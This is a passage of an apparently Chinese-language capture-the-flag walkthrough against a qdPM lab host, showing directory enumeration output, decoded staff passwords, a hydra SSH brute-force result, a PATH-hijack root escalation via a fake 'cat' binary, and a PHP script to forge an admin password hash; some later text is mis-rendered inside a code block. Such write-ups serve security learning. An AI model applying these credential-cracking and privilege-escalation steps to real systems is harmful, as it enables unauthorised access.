-    2KB - /template/                                       </span><br><span class="line">[10:04:44] 301 -  317B  - /core  -&gt;  http://192.168.159.153/core/          </span><br><span class="line">[10:04:44] 200 -    3KB - /core/                                           </span><br><span class="line">[10:04:44] 301 -  320B  - /install  -&gt;  http://192.168.159.153/install/    </span><br><span class="line">[10:04:44] 200 -    2KB - /install/                                        </span><br><span class="line">[10:04:44] 301 -  319B  - /manual  -&gt;  http://192.168.159.153/manual/      </span><br><span class="line">[10:04:44] 200 -  676B  - /manual/                                         </span><br><span class="line">[10:04:47] 301 -  315B  - /js  -&gt;  http://192.168.159.153/js/              </span><br><span class="line">[10:04:47] 200 -    2KB - /js/                                             </span><br><span class="line">[10:04:49] 301 -  323B  - /javascript  -&gt;  http://192.168.159.153/javascript/</span><br><span class="line">[10:04:49] 403 -  280B  - /javascript/                                     </span><br><span class="line">[10:04:52] 200 -    0B  - /check.php                                       </span><br><span class="line">[10:04:54] 200 -    1KB - /sf/                                             </span><br><span class="line">[10:04:54] 301 -  315B  - /sf  -&gt;  http://192.168.159.153/sf/              </span><br><span class="line">[10:04:57] 200 -  470B  - /readme.txt                                       </span><br><span class="line">[10:04:58] 200 -   26B  - /robots.txt                                       </span><br><span class="line">[10:07:34] 200 -  746B  - /backups/                                         </span><br><span class="line">[10:07:34] 301 -  320B  - /backups  -&gt;  http://192.168.159.153/backups/</span><br><span class="line">[10:09:34] 301 -  318B  - /batch  -&gt;  http://192.168.159.153/batch/          </span><br><span class="line">[10:09:34] 200 -  945B  - /batch/                                            </span><br><span class="line">[10:32:26] 403 -  280B  - /server-status/                                     </span><br><span class="line">[10:32:26] 403 -  280B  - /server-status                                      </span><br><span class="line">                                                                                </span><br><span class="line">Task Completed</span><br></pre></td></tr></table></figure>
+<p>有个 <code>/install/</code>
+，或许可以重装，利用前面所得数据库信息重装</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180911033.png" /></p>
+<p>但依旧无法登录……继续折腾数据库</p>
+<p>尝试用 mysql 写 shell 也没成功【<a
+target="_blank" rel="noopener" href="https://wiki.wgpsec.org/knowledge/web/mysql-write-shell.html">MySQL写shell
+| 狼组安全团队公开知识库</a>】</p>
+<p>找到个 staff 数据库，从中得到了一些用户名和密码</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404180936293.png" /></p>
+<p>username</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Smith  </span><br><span class="line">Lucas  </span><br><span class="line">Travis </span><br><span class="line">Dexter</span><br><span class="line">Meyer</span><br></pre></td></tr></table></figure>
+<p>password base64解码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c3VSSkFkR3dMcDhkeTNyRg==</span><br><span class="line">suRJAdGwLp8dy3rF</span><br><span class="line">N1p3VjRxdGc0MmNtVVhHWA==</span><br><span class="line">7ZwV4qtg42cmUXGX</span><br><span class="line">WDdNUWtQM1cyOWZld0hkQw==</span><br><span class="line">X7MQkP3W29fewHdC</span><br><span class="line">REpjZVZ5OThXMjhZN3dMZw==</span><br><span class="line">DJceVy98W28Y7wLg</span><br><span class="line">Y3FObkJXQ0J5UzJEdUpTeQ==</span><br><span class="line">cqNnBWCByS2DuJSy</span><br></pre></td></tr></table></figure>
+<p>hydra 爆破 ssh</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181047010.png" /></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[22][ssh] host: 192.168.159.153   login: travis   password: DJceVy98W28Y7wLg</span><br><span class="line">[22][ssh] host: 192.168.159.153   login: dexter   password: 7ZwV4qtg42cmUXGX</span><br></pre></td></tr></table></figure>
+<p>可见用户名要小写，且 user 和 login 表并不是基于 id 对应的……</p>
+<h2 id="渗透攻击">2. 渗透攻击</h2>
+<h3 id="获取-shell">2.1. 获取 shell</h3>
+<p>ssh 依次登录</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181140374.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181140376.png" /></p>
+<h3 id="提权">2.2. 提权</h3>
+<p>传个 pspy64 监视执行 get_access 有什么特点……</p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181141226.png" /></p>
+<p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181141225.png" /></p>
+<p>可见，每次执行 get_access 时都会以 root 权限调用 cat
+命令来读取系统信息，尝试替换 cat 来提权</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> /tmp/			<span class="comment"># 可写目录	</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;/bin/bash&#x27;</span> &gt; <span class="built_in">cat</span>		<span class="comment"># 把/bin/bash写入到cat中。</span></span><br><span class="line"><span class="built_in">chmod</span> +x <span class="built_in">cat</span>					<span class="comment"># 增加执行权限</span></span><br><span class="line"><span class="built_in">export</span> PATH=.:<span class="variable">$PATH</span>         <span class="comment"># 修改$PATH 变量，添加当前路径到系统路径中</span></span><br><span class="line">/opt/get_access           <span class="comment"># 触发 cat 提权</span></span><br><span class="line">``````</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181202417.png)</span><br><span class="line"></span><br><span class="line">拿到 flag  </span><br><span class="line"></span><br><span class="line"><span class="comment">## 3. 补充</span></span><br><span class="line"></span><br><span class="line"><span class="comment">### 3.1. 修改 qdpm 的登录密码</span></span><br><span class="line"></span><br><span class="line">下载 qdPM 源码 【[Free Web-Based Project Management - qdPM Project Management, Time Tracking, Support Tickets, Open Source](https://qdpm.net/)】看看加密函数，</span><br><span class="line"></span><br><span class="line">`qdPM_9.3\install\actions\install_qdpm.php` 找到了加密操作</span><br><span class="line"></span><br><span class="line">![](https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/202404181350899.png)</span><br><span class="line"></span><br><span class="line">根据提示看看 `/core/lib/PasswordHash.php` ，利用里面的函数生成个 <span class="built_in">hash</span> 来替换原先的【[PHP 在线工具 | 菜鸟工具](https://www.jyshare.com/compile/1/)】  </span><br><span class="line"></span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">class PasswordHash &#123;</span><br><span class="line">	var <span class="variable">$itoa64</span>;</span><br><span class="line">	var <span class="variable">$iteration_count_log2</span>;</span><br><span class="line">	var <span class="variable">$portable_hashes</span>;</span><br><span class="line">	var <span class="variable">$random_state</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> __construct(<span class="variable">$iteration_count_log2</span>, <span class="variable">$portable_hashes</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$this</span>-&gt;itoa64 = <span class="string">&#x27;./0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$iteration_count_log2</span> &lt; 4 || <span class="variable">$iteration_count_log2</span> &gt; 31)</span><br><span class="line">			<span class="variable">$iteration_count_log2</span> = 8;</span><br><span class="line">		<span class="variable">$this</span>-&gt;iteration_count_log2 = <span class="variable">$iteration_count_log2</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$this</span>-&gt;portable_hashes = <span class="variable">$portable_hashes</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$this</span>-&gt;random_state = microtime();</span><br><span class="line">		<span class="keyword">if</span> (function_exists(<span class="string">&#x27;getmypid&#x27;</span>))</span><br><span class="line">			<span class="variable">$this</span>-&gt;random_state .= getmypid();</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> get_random_bytes(<span class="variable">$count</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    </span><br><span class="line">    /*</span><br><span class="line">		<span class="keyword">if</span> (is_readable(<span class="string">&#x27;/dev/urandom&#x27;</span>) &amp;&amp;</span><br><span class="line">		    (<span class="variable">$fh</span> = @fopen(<span class="string">&#x27;/dev/urandom&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>))) &#123;</span><br><span class="line">			<span class="variable">$output</span> = fread(<span class="variable">$fh</span>, <span class="variable">$count</span>);</span><br><span class="line">			fclose(<span class="variable">$fh</span>);</span><br><span class="line">		&#125;</span><br><span class="line">    */</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="variable">$output</span>) &lt; <span class="variable">$count</span>) &#123;</span><br><span class="line">			<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">			<span class="keyword">for</span> (<span class="variable">$i</span> = 0; <span class="variable">$i</span> &lt; <span class="variable">$count</span>; <span class="variable">$i</span> += 16) &#123;</span><br><span class="line">				<span class="variable">$this</span>-&gt;random_state =</span><br><span class="line">				    md5(microtime() . <span class="variable">$this</span>-&gt;random_state);</span><br><span class="line">				<span class="variable">$output</span> .=</span><br><span class="line">				    pack(<span class="string">&#x27;H*&#x27;</span>, md5(<span class="variable">$this</span>-&gt;random_state));</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="variable">$output</span> = substr(<span class="variable">$output</span>, 0, <span class="variable">$count</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> encode64(<span class="variable">$input</span>, <span class="variable">$count</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">		<span class="variable">$i</span> = 0;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="variable">$value</span> = ord(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[<span class="variable">$value</span> &amp; 0x3f];</span><br><span class="line">			<span class="keyword">if</span> (<span class="variable">$i</span> &lt; <span class="variable">$count</span>)</span><br><span class="line">				<span class="variable">$value</span> |= ord(<span class="variable">$input</span>[<span class="variable">$i</span>]) &lt;&lt; <span class="string">8;</span></span><br><span class="line"><span class="string">			$output .= $this-&gt;itoa64[($value &gt;&gt; 6) &amp; 0x3f];</span></span><br><span class="line"><span class="string">			if ($i++ &gt;= $count)</span></span><br><span class="line"><span class="string">				break;</span></span><br><span class="line"><span class="string">			if ($i &lt; $count)</span></span><br><span class="line"><span class="string">				$value |= ord($input[$i]) &lt;&lt; 16;</span></span><br><span class="line"><span class="string">			$output .= $this-&gt;itoa64[($value &gt;&gt; 12) &amp; 0x3f];</span></span><br><span class="line"><span class="string">			if ($i++ &gt;= $count)</span></span><br><span class="line"><span class="string">				break;</span></span><br><span class="line"><span class="string">			$output .= $this-&gt;itoa64[($value &gt;&gt; 18) &amp; 0x3f];</span></span><br><span class="line"><span class="string">		&#125; while ($i &lt; $count);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $output;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function gensalt_private($input)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$output = &#x27;$P$&#x27;;</span></span><br><span class="line"><span class="string">		$output .= $this-&gt;itoa64[min($this-&gt;iteration_count_log2 +</span></span><br><span class="line"><span class="string">			((PHP_VERSION &gt;= &#x27;5&#x27;) ? 5 : 3), 30)];</span></span><br><span class="line"><span class="string">		$output .= $this-&gt;encode64($input, 6);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $output;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function crypt_private($password, $setting)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$output = &#x27;*0&#x27;;</span></span><br><span class="line"><span class="string">		if (substr($setting, 0, 2) == $output)</span></span><br><span class="line"><span class="string">			$output = &#x27;*1&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$id = substr($setting, 0, 3);</span></span><br><span class="line"><span class="string">		# We use &quot;$P$&quot;, phpBB3 uses &quot;$H$&quot; for the same thing</span></span><br><span class="line"><span class="string">		if ($id != &#x27;$P$&#x27; &amp;&amp; $id != &#x27;$H$&#x27;)</span></span><br><span class="line"><span class="string">			return $output;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$count_log2 = strpos($this-&gt;itoa64, $setting[3]);</span></span><br><span class="line"><span class="string">		if ($count_log2 &lt; 7 || $count_log2 &gt; 30)</span></span><br><span class="line"><span class="string">			return $output;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$count = 1 &lt;&lt; $count_log2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		$salt = substr($setting, 4, 8</span>);</span><br><span class="line">		<span class="keyword">if</span> (strlen(<span class="variable">$salt</span>) != 8)</span><br><span class="line">			<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment"># We&#x27;re kind of forced to use MD5 here since it&#x27;s the only</span></span><br><span class="line">		<span class="comment"># cryptographic primitive available in all versions of PHP</span></span><br><span class="line">		<span class="comment"># currently in use.  To implement our own low-level crypto</span></span><br><span class="line">		<span class="comment"># in PHP would result in much worse performance and</span></span><br><span class="line">		<span class="comment"># consequently in lower iteration counts and hashes that are</span></span><br><span class="line">		<span class="comment"># quicker to crack (by non-PHP code).</span></span><br><span class="line">		<span class="keyword">if</span> (PHP_VERSION &gt;= <span class="string">&#x27;5&#x27;</span>) &#123;</span><br><span class="line">			<span class="variable">$hash</span> = md5(<span class="variable">$salt</span> . <span class="variable">$password</span>, TRUE);</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="variable">$hash</span> = md5(<span class="variable">$hash</span> . <span class="variable">$password</span>, TRUE);</span><br><span class="line">			&#125; <span class="keyword">while</span> (--<span class="variable">$count</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="variable">$hash</span> = pack(<span class="string">&#x27;H*&#x27;</span>, md5(<span class="variable">$salt</span> . <span class="variable">$password</span>));</span><br><span class="line">			<span class="keyword">do</span> &#123;</span><br><span class="line">				<span class="variable">$hash</span> = pack(<span class="string">&#x27;H*&#x27;</span>, md5(<span class="variable">$hash</span> . <span class="variable">$password</span>));</span><br><span class="line">			&#125; <span class="keyword">while</span> (--<span class="variable">$count</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = substr(<span class="variable">$setting</span>, 0, 12);</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;encode64(<span class="variable">$hash</span>, 16);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> gensalt_extended(<span class="variable">$input</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$count_log2</span> = min(<span class="variable">$this</span>-&gt;iteration_count_log2 + 8, 24);</span><br><span class="line">		<span class="comment"># This should be odd to not reveal weak DES keys, and the</span></span><br><span class="line">		<span class="comment"># maximum valid value is (2**24 - 1) which is odd anyway.</span></span><br><span class="line">		<span class="variable">$count</span> = (1 &lt;&lt; <span class="variable">$count_log2</span>) - 1;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;_&#x27;</span>;</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[<span class="variable">$count</span> &amp; 0x3f];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; 6) &amp; 0x3f];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; 12) &amp; 0x3f];</span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;itoa64[(<span class="variable">$count</span> &gt;&gt; 18) &amp; 0x3f];</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> .= <span class="variable">$this</span>-&gt;encode64(<span class="variable">$input</span>, 3);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">return</span> <span class="variable">$output</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> gensalt_blowfish(<span class="variable">$input</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="comment"># This one needs to use a different order of characters and a</span></span><br><span class="line">		<span class="comment"># different encoding scheme from the one in encode64() above.</span></span><br><span class="line">		<span class="comment"># We care because the last character in our encoded string will</span></span><br><span class="line">		<span class="comment"># only represent 2 bits.  While two known implementations of</span></span><br><span class="line">		<span class="comment"># bcrypt will happily accept and correct a salt string which</span></span><br><span class="line">		<span class="comment"># has the 4 unused bits set to non-zero, we do not want to take</span></span><br><span class="line">		<span class="comment"># chances and we also do not want to waste an additional byte</span></span><br><span class="line">		<span class="comment"># of entropy.</span></span><br><span class="line">		<span class="variable">$itoa64</span> = <span class="string">&#x27;./ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$output</span> = <span class="string">&#x27;$2a$&#x27;</span>;</span><br><span class="line">		<span class="variable">$output</span> .= chr(ord(<span class="string">&#x27;0&#x27;</span>) + <span class="variable">$this</span>-&gt;iteration_count_log2 / 10);</span><br><span class="line">		<span class="variable">$output</span> .= chr(ord(<span class="string">&#x27;0&#x27;</span>) + <span class="variable">$this</span>-&gt;iteration_count_log2 % 10);</span><br><span class="line">		<span class="variable">$output</span> .= <span class="string">&#x27;$&#x27;</span>;</span><br><span class="line"></span><br><span class="line">		<span class="variable">$i</span> = 0;</span><br><span class="line">		<span class="keyword">do</span> &#123;</span><br><span class="line">			<span class="variable">$c1</span> = ord(<span class="variable">$input</span>[<span class="variable">$i</span>++]);</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span> &gt;&gt; 2];</span><br><span class="line">			<span class="variable">$c1</span> = (<span class="variable">$c1</span> &amp; 0x03) &lt;&lt; <span class="string">4;</span></span><br><span class="line"><span class="string">			if ($i &gt;= 16) &#123;</span></span><br><span class="line"><span class="string">				$output .= $itoa64[$c1];</span></span><br><span class="line"><span class="string">				break;</span></span><br><span class="line"><span class="string">			&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			$c2 = ord($input[$i++]);</span></span><br><span class="line"><span class="string">			$c1 |= $c2 &gt;&gt; 4</span>;</span><br><span class="line">			<span class="variable">$output</span> .= <span class="variable">$itoa64</span>[<span class="variable">$c1</span>];</span><br><span class="line">			<span class="variable">$c1</span> = (<span class="variable">$c2</span> &amp; 0x0f) &lt;&lt; <span class="string">2;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">			$c2 = ord($input[$i++]);</span></span><br><span class="line"><span class="string">			$c1 |= $c2 &gt;&gt; 6;</span></span><br><span class="line"><span class="string">			$output .= $itoa64[$c1];</span></span><br><span class="line"><span class="string">			$output .= $itoa64[$c2 &amp; 0x3f];</span></span><br><span class="line"><span class="string">		&#125; while (1);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $output;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function HashPassword($password)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$random = &#x27;&#x27;;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    /*</span></span><br><span class="line"><span class="string">		if (CRYPT_BLOWFISH == 1 &amp;&amp; !$this-&gt;portable_hashes) &#123;</span></span><br><span class="line"><span class="string">			$random = $this-&gt;get_random_bytes(16);</span></span><br><span class="line"><span class="string">			$hash =</span></span><br><span class="line"><span class="string">			    crypt($password, $this-&gt;gensalt_blowfish($random));</span></span><br><span class="line"><span class="string">			if (strlen($hash) == 60)</span></span><br><span class="line"><span class="string">				return $hash;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		if (CRYPT_EXT_DES == 1 &amp;&amp; !$this-&gt;portable_hashes) &#123;</span></span><br><span class="line"><span class="string">			if (strlen($random) &lt; 3)</span></span><br><span class="line"><span class="string">				$random = $this-&gt;get_random_bytes(3);</span></span><br><span class="line"><span class="string">			$hash =</span></span><br><span class="line"><span class="string">			    crypt($password, $this-&gt;gensalt_extended($random));</span></span><br><span class="line"><span class="string">			if (strlen($hash) == 20)</span></span><br><span class="line"><span class="string">				return $hash;</span></span><br><span class="line"><span class="string">		&#125;</span></span><br><span class="line"><span class="string">		*/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		if (strlen($random) &lt; 6)</span></span><br><span class="line"><span class="string">			$random = $this-&gt;get_random_bytes(6);</span></span><br><span class="line"><span class="string">		$hash =</span></span><br><span class="line"><span class="string">		    $this-&gt;crypt_private($password,</span></span><br><span class="line"><span class="string">		    $this-&gt;gensalt_private($random));</span></span><br><span class="line"><span class="string">		if (strlen($hash) == 34)</span></span><br><span class="line"><span class="string">			return $hash;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		# Returning &#x27;*&#x27; on error is safe here, but would _not_ be safe</span></span><br><span class="line"><span class="string">		# in a crypt(3)-like function used _both_ for generating new</span></span><br><span class="line"><span class="string">		# hashes and for validating passwords against existing hashes.</span></span><br><span class="line"><span class="string">		return &#x27;*&#x27;;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	function CheckPassword($password, $stored_hash)</span></span><br><span class="line"><span class="string">	&#123;</span></span><br><span class="line"><span class="string">		$hash = $this-&gt;crypt_private($password, $stored_hash);</span></span><br><span class="line"><span class="string">		if ($hash[0] == &#x27;*&#x27;)</span></span><br><span class="line"><span class="string">			$hash = crypt($password, $stored_hash);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">		return $hash == $stored_hash;</span></span><br><span class="line"><span class="string">	&#125;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$hasher = new PasswordHash(11, false);</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">$administrator_password = &#x27;123456&#x27;;</span></span><br><span class="line"><span class="string">$hashed_password = $hasher-&gt;HashPassword($administrator_password);</span></span><br><span class="line"><span class="string">$trimmed_escaped_hashed_password = trim(addslashes($hashed_password));</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">echo $trimmed_escaped_hashed_password;</span></span><br><span class="line"><span class="string">?&gt;</span></span><br></pre></td></tr></table></figure>
